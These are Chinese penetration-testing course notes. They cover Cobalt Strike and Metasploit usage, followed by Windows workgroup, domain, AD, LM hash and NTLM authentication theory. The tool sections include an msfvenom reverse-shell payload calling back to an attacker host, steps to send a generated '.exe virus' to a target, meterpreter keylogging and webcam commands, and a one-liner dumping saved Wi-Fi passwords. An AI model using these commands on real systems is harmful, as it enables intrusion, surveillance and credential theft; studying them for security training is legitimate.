### 内网常用渗透工具
---

#### Cobalt Strike (CS)

**简介**：Cobalt Strike 是一个Java开发的强大的C2工具，适合内网横向移动、长期潜伏攻击。
**优点**：生态完善，稳定性强，社区支持，许多插件可供使用。
**缺点**：被许多安全厂商识别，需要通过隐蔽技术（如域前置、流量混淆等）来规避流量特征。

**Cobalt Strike 使用步骤（基于Kali）：**

Cobalt Strike 官网：[点击访问](https://www.cobaltstrike.com/)【中国IP无法访问】

安装包：[百度网盘 | 阶段四资源包](https://pan.baidu.com/s/1D190IzRHf6hiZsuYnbSdFw?pwd=bwia )

1）下载安装成功后，首先对`Server`文件夹和`Client`文件夹的所有文件进行提权操作，先使用`root`用户打开该文件夹；

![[Pasted image 20250716231754.png]]

2）再使用如下提权命令：

```bash
chmod -R 777 *  # 可读可写可执行
```

![[Pasted image 20250716232447.png]]

3）在开启CS之前，需要执行`ifconfig`查询一下当前电脑的IP，如下所示：

![[Pasted image 20250717085102.png]]

4）然后进行CS的开启流程，即在`Server`文件夹的终端执行下述命令：

```bash
./teamserver 主机IP 主机连接密码
```

![[Pasted image 20250717085510.png]]

5）在`Client`文件夹的终端执行下述命令：

```bash
./Cobalt_Strike_CN.bat
```

![[Pasted image 20250717085658.png]]

在成功执行上述两个命令后，将成功打开Cobalt Strike连接界面，如下：

![[Pasted image 20250717085913.png]]

6）输入与配置文件相符的port端口，再输入本机的连接密码，点击`connect`进行连接即可成功进入CS，如下界面：

![[Pasted image 20250717090932.png]]

**实操案例：创建`.exe`病毒文件发送给目标Windows，实现操控目标电脑**

1）在打开的CS界面进行监听器的添加，因为后续要使用监听器监听目标对象

![[Pasted image 20250717092216.png]]

2）创建`.exe`病毒文件，具体操作如下：

![[Pasted image 20250717093539.png]]

3）点击生成`Generate`按钮后将弹出文件存储路径，自定义路径保存后即可成功生成文件。

![[Pasted image 20250717094047.png]]

4）将病毒文件发送至目标主机，当主机开始执行后CS界面将出现回显，病毒文件执行前后CS界面对比如下：

![[Pasted image 20250717094749.png]]

![[Pasted image 20250717095046.png]]

5）对目标主机实现渗透，例如执行shell命令等，如下：

![[Pasted image 20250717095523.png]]

常用shell命令如下：

```shell
# 收集主机信息，包括IP、操作系统版本、补丁等
systeminfo

# 查看已安装的软件及版本
wmic product get name,version
powershell "Get-WmiObject -Class win32_product | Select-Object name, version"

# 查看防火墙信息
netsh firewall show state

# 查看防火墙配置
netsh firewall show config

# 查看本地工作组信息
net localgroup

# 查看管理员组成员
net localgroup administrators

# 查看连接过的Wi-Fi网络名称
netsh wlan show profiles

# 获取特定Wi-Fi网络的密码
netsh wlan show profile name="xxx" key=clear

#查看所有 wifi 及密码
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo |netsh wlan show profiles %j key=clear
```

#### Metasploit Framework (MSF)

**简介**：Metasploit 是一款开源的渗透测试框架，内置了丰富的漏洞攻击工具和模块。
**优点**：支持Windows和Linux，攻击模块非常丰富。
**缺点**：以命令行操作为主。

1）首先以Root身份打开桌面文件夹

![[Pasted image 20250717102243.png]]

2）然后在当前文件夹打开终端，输入`msfconsole`启动MSF命令，如下：

```bash
msfconsole
```

![[Pasted image 20250717102627.png]]

3）生成恶意程序 ，其语法如下：

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.17 LPORT=3333 -f exe > xd.exe
```

- **`msfvenom`**： Metasploit 框架下的一个工具，主要功能是生成各种攻击载荷，并且能够将这些载荷打包成不同的文件格式。
- **`-p windows/meterpreter/reverse_tcp`**： `-p` 是用来指定要使用的攻击载荷（payload）。这里选择的是 `windows/meterpreter/reverse_tcp`，这是专门针对 Windows 系统的一种载荷。它的工作原理是，当这个载荷在目标系统上运行后，会主动连接到攻击者指定的主机和端口，建立一个反向的 TCP 连接，进而让攻击者获得一个交互式的 shell 会话。
- **`LHOST=192.168.1.17` 和 `LPORT=3333`**： `LHOST` 指的是攻击者主机的 IP 地址，目标系统会主动连接到这个 IP 地址。 `LPORT` 是攻击者主机上监听的端口号。 
- **`-f exe`** ：`-f` 用于指定输出文件的格式，`exe` 表示生成的是 Windows 可执行文件。
- **`> xd.exe`**： 这是将生成的恶意程序输出并保存为 `xd.exe` 文件。

![[Pasted image 20250717105316.png]]

![[Pasted image 20250717105618.png]]

> 注意：考虑到兼容性的问题。恶意程序默认生成为32位，若要生成64位的需要在`windows/`后加`x64/`

4）生成恶意程序后，执行 `use exploit/multi/handler` 命令，该命令用于加载 `multi/handler` 模块，这个模块的作用是监听特定的端口，等待目标系统连接过来，是专门为配合反向连接载荷使用而设计的。如下：

```bash
use exploit/multi/handler
```

![[Pasted image 20250717112817.png]]

5）执行`set payload windows/meterpreter/reverse_tcp`命令，明确告诉 Metasploit 要使用的载荷类型，这里设置为与之前生成恶意程序时相同的 `windows/meterpreter/reverse_tcp` 载荷，以确保两者能够相互匹配。

```bash
set payload windows/meterpreter/reverse_tcp
```

![[Pasted image 20250717121342.png]]

6）执行`set lhost 0.0.0.0`  和 **`set lport 3333`**  ，`lhost` 代表本地监听的 IP 地址，设置为 `0.0.0.0` 意味着 Metasploit 会在所有可用的网络接口上进行监听，这样一来，无论外部通过哪个 IP 地址访问，都能够接收到连接。`lport` 是本地监听的端口号，这里设置为 `3333`，必须和之前生成载荷时指定的端口号保持一致，否则目标系统将无法成功连接。

![[Pasted image 20250717172347.png]]

7）执行`run`开启监听操作，此时 Metasploit 会开始在指定的端口上监听，等待目标系统运行恶意程序后主动连接过来。一旦收到连接，攻击者就能获得一个 `meterpreter` 会话，从而对目标系统进行进一步的操作。如下所示是开启监听且获得的一个会话：

![[Pasted image 20250717172522.png]]

8）接下来就可以在当前会话窗执行目标命令，例如截取当前目标主机的屏幕，如下：

```bash
screenshot
```

![[Pasted image 20250717172920.png]]

**MSF常用命令如下：**

```
上传下载
  #上传文件：upload [文件位置] [被控主机目标位置]
  meterpreter > upload /home/kali/桌面/clear.txt C:\\Users\\14580\\Desktop\\clear.txt  
  #下载文件：downlaod [被控主机目标文件位置] [本地文件位置]
  meterpreter > download C:\\Users\\14580\\Desktop\\123.txt /home/kali/桌面/
  #为什么路径使用 \\ ？
  在 Windows 中，目录路径使用反斜杠 \ 作为分隔符，但在 某些环境（如 Meterpreter）中，\ 是转义字符

查看当前用户权限:getuid
自动提升权限:getsystem
查看当前所在位置:getwd
查看文件和目录：ls
屏幕截图: screenshot
屏幕监控: screenshare
屏幕操控：run vnc
键盘记录：keyscan_start
记录内容：keyscan_dump
停止记录：keyscan_stop
摄像头：webcam_stream
进入终端界面：shell
修改默认终端字符集：chcp 65001
```

### 网络架构基础
---

#### 工作组（Workgroup）

**定义**：是一种分散式的网络管理模式，由多台计算机自愿组成的“对等网络”（Peer-to-Peer），每台计算机都是独立的“平等个体”，没有统一的管理中心。

**核心特点**： 
- 无中央服务器，每台计算机自主管理本地用户账号、权限和资源（如文件、打印机）。 
- 计算机之间通过“工作组名称”识别彼此（默认名称为“**WORKGROUP**”），但没有层级关系。

**优缺点：**
- **优点**：“去中心化”的简易模式，灵活，适用于小规模网络。
- **缺点**：没有统一的账户管理，无法集中管理和控制。

**工作组操作**：
- **创建工作组**：如果在网络中没有该名称的工作组，创建一个新工作组。
- **加入工作组**：右击计算机图标选择“属性”并修改工作组名称。
- **退出工作组**：修改计算机的工作组名称即可。

**工作组的适用场景：**
- **家庭网络**：3-5 台电脑共享文件、打印机，无需复杂管理。
- **小型办公室**：10 人以内团队，成员较少且信任度高，无需严格权限控制。
- **临时网络**：如展会、研讨会的临时设备互联，快速搭建且无需长期维护。

![[Pasted image 20250718084248.png]]

#### 域（Domain） 

**定义**：是一种集中式的网络管理模式，由一台或多台**域控制器（Domain Controller, DC）** 统一管理网络中的计算机、用户、权限和资源。 

**核心特点**： 
- 以域控制器为核心，所有用户账号、安全策略、资源权限均由域控制器集中存储和管理（基于活动目录AD，Active Directory）。 
- 网络中的计算机（称为“域成员机”）必须加入域才能受其管理，遵循域控制器的统一规则。 

**优缺点：**
- **优点**：“中心化”的专业模式，适合中大规模网络，安全可控，易于管理
- **缺点**：没有统一的账户管理，无法集中管理和控制。

**域的分类：**
- **单域**：一个网络环境中只有一个域，适用于小型网络。
- **父子域**：父域和子域之间有从属关系，子域继承父域的一些资源和权限。

**域树和域森林**
- **域树**：由多个域组成，通过信任关系连接。父域和子域之间可以跨域共享资源。
- **域森林**：多个域树构成的集合，支持跨域、跨林的资源共享。

**域的适用场景**
- **企业网络**：数百台计算机、多部门员工，需要统一管理账号（如 “张三” 在任何域内电脑都能登录）、限制资源访问（如财务文件仅财务组可见）。
- **学校 / 机构**：统一部署软件、补丁，限制学生电脑的操作权限（如禁止安装程序）。
- **跨地域网络**：通过域控制器的复制功能（如多站点 AD 同步），实现不同地点的网络统一管理。

#### **工作组和域关键区别**

| **对比维度**  | **工作组（Workgroup）**           | **域（Domain）**                                |
| :-------- | :--------------------------- | :------------------------------------------- |
| **管理方式**  | 分散式：每台计算机独立管理本地用户和资源。        | 集中式：域控制器统一管理所有用户、计算机和策略。                     |
| **用户认证**  | 登录时使用 “本地账号”（仅在本机有效）。        | 登录时使用 “域账号”（在整个域内有效，无需重复创建）。                 |
| **适用规模**  | 小型网络（通常≤10 台计算机），如家庭、小型办公室。  | 中大型网络（≥10 台计算机），如企业、学校、机构。                   |
| **安全性**   | 较低：权限管理分散，易出现配置不一致（如密码策略混乱）。 | 较高：域控制器统一部署安全策略（如密码复杂度、防火墙规则）。               |
| **资源共享**  | 需手动在每台计算机上设置共享权限，跨机访问需重复验证。  | 域内资源（如文件服务器、打印机）统一授权，一次登录即可访问所有授权资源。         |
| **服务器依赖** | 无服务器，纯对等连接。                  | 必须有域控制器（运行 Windows Server 系统，如 Server 2019）。 |
| **灵活性**   | 部署简单，无需专业知识，但扩展困难。           | 部署复杂（需配置 AD、DNS 等），但易于大规模扩展和维护。              |

#### **域控制器（Domain Controller, DC）**

域控制器是**域（Domain）网络架构**的核心管理节点，主要负责集中管理域内的用户账号、计算机、安全策略等，是企业级网络的 “管理中枢”。

**核心功能**
- **集中身份认证**：存储域内所有用户的账号信息（通过**活动目录 AD，Active Directory**），用户只需用一个域账号即可登录域内任何授权计算机，无需在每台机器上重复创建账号。
- **权限与资源管理**：统一分配用户对文件、打印机、服务器等资源的访问权限，例如限制 “普通员工” 访问财务服务器，允许 “管理员” 修改网络策略。
- **安全策略部署**：通过域控制器向所有域成员机推送统一的安全规则，如密码复杂度要求（如至少 8 位、包含大小写字母）、防火墙配置、软件安装限制等，确保整个域的安全一致性。
- **活动目录（AD）维护**：AD 是域控制器的核心数据库，存储着域内所有对象（用户、计算机、组、策略等）的信息，域控制器负责 AD 的创建、更新和同步（多域控制器环境下）。

**典型应用场景**
- 企业网络中，管理员通过域控制器管理数百台电脑的用户登录和权限。
- 学校网络中，通过域控制器限制学生电脑安装软件、访问特定网站。

**关键特性**
- 通常运行在 Windows Server 系统（如 Windows Server 2019/2022），需安装 “Active Directory 域服务” 角色。
- 大型网络中可部署多台域控制器（主 DC + 备用 DC），避免单点故障，提高可靠性。

#### **域名服务器（Domain Name Server, DNS）**

域名服务器是**TCP/IP 网络**的 “翻译官”，负责将人类易记的域名（如[www.baidu.com](https://www.baidu.com/)）** 转换为计算机能识别的**IP 地址（如 180.101.50.242）**，是互联网和局域网通信的基础。

**核心功能**
- **域名解析**：这是 DNS 的核心作用。例如，当用户在浏览器输入 “[www.google.com](https://www.google.com/)” 时，DNS 服务器会查询并返回其对应的 IP 地址，使计算机能找到目标服务器并建立连接。
- **分布式数据库**：DNS 采用全球分布式架构，没有一台服务器存储所有域名信息。例如，“.com” 域名由顶级 DNS 服务器管理，“[baidu.com](https://baidu.com/)” 由百度自己的 DNS 服务器管理，各级服务器协同工作完成解析。
- **缓存功能**：DNS 服务器会缓存已解析过的域名 - IP 对应关系，下次同一域名查询时可直接返回结果，减少重复查询时间，提高网络效率。

![[Pasted image 20250718084320.png]]

**分类与场景**
- **根 DNS 服务器**：全球共 13 组，负责指向顶级域名服务器（如 “.com”“.cn”），是域名解析的 “起点”。
- **顶级域名服务器**：管理 “.com”“.org”“.cn” 等顶级域名，例如 “.cn” 服务器会指向 “[baidu.cn](https://baidu.cn/)” 的权威 DNS 服务器。
- **权威 DNS 服务器**：由企业或机构自建，管理自己的域名（如百度的 DNS 服务器管理 “[baidu.com](https://baidu.com/)” 及其子域名 “[map.baidu.com](https://map.baidu.com/)”）。
- **本地 DNS 服务器**：家庭或公司路由器内置的 DNS，或运营商提供的 DNS（如 114.114.114.114），负责为本地设备提供解析服务，并缓存结果。

**与域控制器的关联**
在域环境中，域控制器通常需要依赖 DNS 服务器才能正常工作：
- 域成员机需要通过 DNS 找到域控制器的 IP 地址（例如，域名为 “[corp.com](https://corp.com/)” 的域，成员机会查询 “[dc.corp.com](https://dc.corp.com/)” 对应的 IP）。
- 因此，企业网络中常将 DNS 服务集成到域控制器中（Windows Server 可同时安装 AD 和 DNS 角色），简化部署。

#### **域控制器 vs 域名服务器：核心区别**

|   **对比维度**    |          **域控制器（DC）**          |          **域名服务器（DNS）**           |
| :-----------: | :----------------------------: | :-------------------------------: |
|   **核心作用**    |    管理域内用户、权限、安全策略（“网络管理员”）     |      解析域名与 IP 的对应关系（“网络翻译官”）      |
|  **依赖的核心技术**  |            活动目录（AD）            |            DNS 协议与数据库             |
|   **适用范围**    |     仅在 “域网络” 中存在，是域架构的必需组件     |    所有 TCP/IP 网络（包括互联网、局域网）都需要     |
| **典型软件 / 系统** | 运行 Windows Server（安装 AD 域服务角色） | BIND（开源）、Windows DNS 服务、阿里云 DNS 等 |

**总结**

- **域控制器**是域网络的 “管理者”，通过活动目录实现用户、权限和安全策略的集中管控，确保企业网络的有序和安全。
- **域名服务器**是所有网络的 “翻译官”，解决 “人类记域名、计算机认 IP” 的矛盾，是网络通信的基础。
- 两者在企业网络中常协同工作（如域控制器依赖 DNS 定位），但功能和作用截然不同。

### **Windows 用户权限**
---

Windows 用户权限主要分为**工作组**（Workgroup）和**域**（Domain）两种环境，每种环境都有不同的用户权限管理方式。在内网渗透过程中，理解这两种权限结构有助于制定合适的攻击策略。

#### **1 Windows 工作组权限**

**工作组**是 Windows 计算机的默认管理模式，每台计算机都是独立的，没有统一的身份认证机制。所有用户账号都存储在本地SAM数据库中，仅能管理**本机权限**。

##### **工作组用户分类**

|**用户类型**|**描述**|**权限范围**|
|---|---|---|
|**Administrator（本机管理员）**|拥有最高权限，可管理所有本机资源|可完全控制本机，修改系统配置、创建用户、访问敏感文件等|
|**Administrators 组（管理员组）**|具有管理员权限的用户，可执行大部分管理操作|可安装软件、修改系统设置，但可能受 UAC 限制|
|**Users 组（普通用户组）**|普通用户，权限受限|只能运行已安装的软件，不能修改系统配置|
|**Guest（来宾账户）**|受限用户，无需密码即可登录|只能访问特定资源，权限极低|
|**SYSTEM（系统账户）**|Windows 内部最高权限账户|具有比 `Administrator` 更高的权限，能访问所有进程和文件|

##### **工作组权限管理**

**权限存储位置**：本地 `SAM` 数据库（`C:\Windows\System32\config\SAM`）
**认证方式**：基于**NTLM Hash**进行本地认证
**权限边界**：用户权限仅限于本机，不可跨设备访问资源

#### **2 Windows 域权限**

**域**是 Windows 网络环境中更高级的身份管理模式，由**域控制器（Domain Controller, DC）**统一管理用户账户和权限。所有域用户信息存储在 **Active Directory（AD）** 中，身份认证基于 **Kerberos 协议** 而非本地 `SAM`。

##### **Active Directory（AD）简介**

Active Directory是微软开发的目录服务，主要用于**集中管理**企业网络中的**用户、计算机、组策略和身份认证**。

**核心组件**
**域控制器（DC）**：存储 AD 数据，执行身份认证。
**域（Domain）**：管理用户和设备，如 `example.com`。
**组织单位（OU）**：分类用户和计算机，便于管理。
**组策略（GPO）**：统一配置安全策略和权限。
**LDAP 协议**：用于查询和修改 AD 数据。


**功能**
**身份认证**（Kerberos/NTLM）
**访问控制**（基于组和权限）
**单点登录**
**集中管理用户和设备**

![[Pasted image 20250718092214.png]]

##### 域用户组的层级关系整理

在Windows域环境中，用户组种类繁多，不同用户组具有不同的权限等级，并可通过嵌套（一个组成为另一个组的成员）形成层级结构。以下按照权限从高到低，介绍常见的关键用户组及其特点：

###### 企业系统管理员组（**Enterprise Admins**）

**权限范围**：整个域森林（Forest）中权限最高的组。

**隶属关系**：默认为**根域**中 **Administrators** 组的成员；默认包含在所有子域的 **Administrators** 组中。

**特性**：拥有跨域管理权限；可管理整个森林中的所有域控制器、域策略与活动目录对象。

###### 域管理员组（**Domain Admins**）

**权限范围**：单个域（Domain）内的最高权限。

**隶属关系**：默认为所在域的 **Administrators** 组成员；自动被加入域内每台成员服务器和客户端的本地 **Administrators** 组。

**特性**：可完全控制所在域内的用户、组、计算机和资源；常用于域级别的管理和策略配置。


###### 管理员组（**Administrators**）

**权限范围**：对域控制器或本地计算机资源拥有完全访问权。

**隶属关系**：包含 **Enterprise Admins** 与 **Domain Admins** 的成员；可手动添加其他具有高权限的账户或用户组。

**特性**：主要用于管理活动目录、域控制器、组策略等关键资源；是系统中最核心的高权限组之一。

###### 域用户组（**Domain Users**）

**权限范围**：普通用户级权限，主要执行日常操作。

**隶属关系**：默认包含所有新建的域用户账户；自动加入域内计算机的本地 **Users** 组。

**特性**：无管理权限，不能进行系统级或策略级的操作；操作受限，某些敏感操作需通过管理员授权或UAC（用户帐户控制）认证。

###### 域计算机组（**Domain Computers**）

**权限范围**：用于身份验证与组策略应用的计算机账户组。

**隶属关系**：包含所有加入域的计算机账户（包括服务器与客户端）。

**特性**：主要用于机器间身份认证、组策略分发与计算机管理；不具备用户操作权限，仅代表设备身份。

###### 总结（权限从高到低）

```
Enterprise Admins
      ↓  #默认属于根域的Administrators组
  Domain Admins
      ↓  #默认属于所在域的Administrators组
      ↓  #自动加入每台域内计算机的本地Administrators组
 Administrators
      ↓  #包含Domain Admins和Enterprise Admins组
      ↓  #可包含其他高权限用户组或个体账户
  Domain Users
      ↓  #默认添加到域内计算机的本地Users组
Domain Computers
         #不隶属于其他组，主要管理计算机身份认证。
```

##### **域权限管理**

**权限管理核心**：基于 Active Directory（存储于域控制器 DC）

**身份认证机制**：

- **Kerberos 认证**：主流认证方式，基于 TGT（Ticket Granting Ticket）票据机制
-  **NTLM 认证**：在不支持 Kerberos 或兼容性需求下仍被使用

**权限边界说明**：

- **域用户**：可在多台域内计算机登录；行为受限于 GPO（组策略对象）
- **域管理员**：拥有对整个域内用户、计算机、组策略等资源的完全控制权限

**常见渗透攻击点**：

- **横向移动**：通过 `Pass-the-Hash（PTH）` 或 `Pass-the-Ticket（PTT）` 技术在域内跳转
- **Kerberos 票据攻击**：捕获并破解 Kerberos 票据（TGT 或 TGS），提取 NTLM Hash 实现用户伪装
- **黄金票据（Golden Ticket）攻击**：伪造 krbtgt 账户的 TGT 票据，实现对整个域的持久控制

#### **3 工作组和域环境区别**

|**对比项**|**工作组（Workgroup）**|**域（Domain）**|
|---|---|---|
|**账户存储位置**|本地 `SAM` 数据库|域控制器 `Active Directory`|
|**身份认证方式**|NTLM|Kerberos|
|**权限范围**|仅限本机|可跨设备、跨域访问|
|**管理员账户**|`Administrator`（本地）|`Domain Admins`（全域）|
|**权限提升方式**|本地提权（UAC 绕过、令牌劫持）|Kerberoasting、Golden Ticket|
|**渗透目标/意义**|提权至 `SYSTEM`；仅影响单台主机|获取 `Domain Admins`组用户；最大可控制整个域|

---

#### **4 工作组和域环境的判断**

**本地查询**：

```
systeminfo | findstr /i "Domain"
- 若返回 Domain: WORKGROUP，则为工作组环境
- 若返回 Domain: xxx.local，则为域环境

其他查询方式
ipconfig /all
net time /domain
```

### **Windows 认证体系概述**

#### **1 本地认证**

##### **概述**

本地认证意思就是电脑上存储着自己的账号密码，无论电脑是否联网，只要能开机，就可以凭借账号密码登录。本地认证流程图：
![[Pasted image 20250718094314.png]]
**核心组件**：

`winlogon.exe`：Windows 登录进程，负责用户登录、注销、重启及锁屏后的验证。
`SAM 文件`：位于 `C:\Windows\System32\config\SAM`，用于存储本地用户账户及其加密凭证（不可直接查看明文密码）。

##### **SAM文件和lsass进程**

###### **SAM 文件（Security Account Manager）**

存储内容：本地用户的用户名、RID、LM Hash、NTLM Hash 等。

格式示例：  `UserName : RID : LM-HASH : NTLM-HASH`

 **RID（Relative Identifier）说明**：是 SID（安全标识符）中的唯一部分，用于标识用户、组等安全主体。

**作用**：

- 唯一识别本地用户或组；
- 用于权限分配和资源访问控制；
- 支持跨域环境中的身份识别。

###### **LSASS(Local Security Authority Subsystem Service 本地安全认证子系统服务)**

负责本地安全策略和用户认证。
 
功能包括：密码策略、账户策略、用户权限、域策略等。

**验证过程**：
 
1. 接收 `winlogon` 提交的用户名和密码。
2. 加密后与 `SAM 文件` 中的凭证进行比对。
3. 若验证成功，登录系统；同时将凭证保存在内存中以供后续使用。

##### **LM Hash加密**

LM Hash的全名为"LAN Manager Hash'",是微软为了提高Windows操作系统的安全性而采用的散列加密算法，其本质是DES加密。

尽管LM Hash较容易被破解，但为了保证系统的兼容性，Windows只是将LM Hash禁用了（从Windows vista和Windows Server2008版本开始，Windows操作系统默认禁用LM Hash)。

LM Hash明文密码被限定在14位以内，也就是说，如果要停止使用LM Hash,将用户的密码设置为14位以上即可。

如果LM Hash被禁用了，通过工具抓取的LM Hash通常为`aad3b435b51404eead3b435b51404ee`(表示LM Hash为空值或被禁用)

![[Pasted image 20250718094528.png]]

**加密过程:**

1、明文转大写后转为16进制
2、密码不足14位(字节)末尾使用00补齐
3、分为两组，7字节一组
4、将每一组7个字节的十六进制转为2进制，每7bit一组末尾加0，再转换为16进制，得到2组8字节编码(**1字节 = 8比特**)
5、将以上步骤得到的两组8字节编码，分别作为DES加密的key（密钥），以魔术字符串`KGS!@#$%`的16进制作为明文进行加密

`KGS!@#$%`的十六进制为:`4B47532140232425`

```
以密码aqa@123为例:
(1)41514140313233                         #明文转大写后转为16进制
(2)4151414031323300000000000000           #密码不足14位(字节)末尾使用00补齐
(3)41514140313233、0000000000000000       #分为两组，7字节一组
(4)1000001010100010100000101000000001100010011001000110011
										  #将每一组7个字节的十六进制转为2进制
01000001 01010001 01000001 01000000 00110001 00110010 00110011
										  #补齐位数
(5)第一组：
01000000
10101000
01010000
00101000
00000010
10001000
11001000
01100110                                  #每7bit一组末尾加0
0100000010101000010100000010100000000010100010001100100001100110
40A850280288C866                          #转换为16进制
第二组：
0000000000000000
(6)882C81E2D5BDDA4F AAD3B435B51404EE      #DES加密结果

https://blog.csdn.net/xingke/article/details/102811555
https://lzltool.cn/Toolkit/ConvertStringToHexadecimal      #字符串转十六进制
https://tool.lu/hexconvert/                                #进制加密
https://www.toolhelper.cn/SymmetricEncryption/DES          #DES加密
```

![[Pasted image 20250718094702.png]]

#### **2 网络认证**

##### **概述**

**网络认证分类:网络认证是指用户或设备在访问网络资源时所进行的身份验证过程**。常见的网络认证方式包括：

**用户名和密码认证**  
最基本的认证方式，用户需输入用户名与密码。可用于本地账户或域账户登录。

**Kerberos 认证**  
一种安全性更高的网络身份验证协议，广泛用于 Windows 域环境中。通过票据（TGT）机制实现用户认证与会话密钥协商，加密通信过程更安全可靠。

**NTLM 认证（NT LAN Manager）**  
基于挑战-响应机制的旧版身份认证协议。虽然已被 Kerberos 取代为默认机制，但在某些兼容场景（如旧系统或非域环境）仍被使用。

**密钥身份认证**  
基于预共享密钥进行认证的方式，常用于特定服务或自动化系统登录。

**远程桌面认证（Remote Desktop Authentication）**  
远程访问 Windows 系统时的认证机制，需提供目标主机的有效凭据方可建立连接。


> 场景举例：  
> 在工作组（非域）环境中，主机 A 若要访问主机 B 的共享资源，需使用一个在主机 B 本地已存在的账户进行认证。主机 B 收到凭据后在本地进行校验，验证通过后才允许访问。这就是典型的网络认证过程。

##### NTLM协议挑战响应认证机制

**NTLM（NT LAN Manager）是一种基于 Challenge/Response（挑战-响应）的身份认证协议**，其认证流程如下：

**协商（Negotiate）**  
客户端向服务器发起认证请求，协商使用的协议版本及功能。

**质询（Challenge）**  
服务器生成一个随机数（称为“挑战”）发送给客户端，用于防止重放攻击。

**响应（Response）**  
客户端使用用户的 NTLM Hash 对挑战值加密，生成响应值，同时携带用户名、计算机名、域名等信息一并发回服务器。

**验证（Authenticate）**  
服务器使用保存的 NTLM Hash 以相同方式生成响应值进行比对：
- 若响应匹配，则认证成功；
- 不匹配，则认证失败。

![[Pasted image 20250718100240.png]]

##### 思考题解析

 <font color=purple>NTLM 认证的关键因素是什么？</font>

NTLM 认证的核心是 **Challenge-Response** 机制，它：

- 避免在网络中直接传输明文密码；
- 利用用户密码的 **NTLM Hash** 结合服务端提供的 **Challenge 值**；
- 计算出唯一的 **Response** 值来验证身份。

这种机制虽然相比明文传输更安全，但依赖客户端正确生成的响应，因此仍然存在伪造风险。

---

<font color=purple>获取了 Challenge 和密码后，是否可以伪造认证？</font>

是的。若攻击者已掌握 **服务端 Challenge 和用户明文密码（或 NTLM Hash）**：

- 即可计算合法的 NTLMv2 Response；
- 并构造认证数据包进行伪造认证；
- 因为服务器只验证 Response 值的正确性，不验证 Challenge 来源是否合法。

这就是 **NTLM 可伪造认证问题** 的根源。

---

<font color=purple>为什么不能直接传输 Hash？Challenge 的作用是什么？</font>

如果直接使用固定的 NTLM Hash 进行身份认证，会产生 **重放攻击（Replay Attack）** 风险：

- 攻击者只需捕获一次 Hash，就能多次使用；
- Challenge 的作用是引入一个每次变化的随机数；
- 即使 Hash 相同，不同的 Challenge 会生成不同的 Response，防止认证信息被复用。

因此，**Challenge 是保证认证“唯一性”和“时效性”的关键因素**。

---

##### NTLM 协议的安全问题

NTLMv1 与 NTLMv2 的差异与风险：

|协议版本|加密算法|安全性|破解方式|
|---|---|---|---|
|**NTLMv1**|基于 DES，对 LM/NT Hash 直接加密|较弱|可被 Hashcat 等工具快速破解，或通过彩虹表暴力破解|
|**NTLMv2**|基于 HMAC-MD5，对结构更复杂的内容签名|安全性更高|可被离线破解（如捕获 Net-NTLMv2 Hash 后用密码字典尝试还原）|

##### Windows 10 / 11 中的 NTLM 认证机制

默认启用 **NTLMv2**，提供更强安全保障；但为了兼容老旧设备或应用，部分环境可能仍支持或启用 **NTLMv1**；若未禁用 NTLMv1，将受到以下攻击：

- **Pass-the-Hash（PTH）攻击**：利用已知的 NTLM Hash 伪造认证；
- **离线破解 Net-NTLMv2 Hash**：通过字典或暴力破解工具（如 Hashcat）进行密码恢复；
- **中继攻击（NTLM Relay）**：拦截并转发认证请求，在目标系统中获得授权。

##### Windows 10 与 Windows 11 在 NTLM 认证机制上的差异

|**系统版本**|**NTLM 默认版本**|**NTLMv1 支持情况**|**NTLMv2 特性**|**Kerberos 默认状态**|**安全性改进与防护机制**|
|---|---|---|---|---|---|
|**Windows 10**|NTLMv2|默认允许（可配置禁用）|支持，配合 SMB 签名使用|默认优先使用 Kerberos|支持配置 NTLM 阻止策略、SMB 签名可选启用、无默认 NTLM Relay 防护|
|**Windows 11**|NTLMv2|默认禁用 NTLMv1|强化 SMB 安全性（默认启用签名）|默认启用 Kerberos（优先）|默认启用 NTLM Relay 防护机制、增强身份验证完整性、可配置严格的认证策略|

---

上一篇：NULL                   下一篇：[[L4-6 内网基础2]]
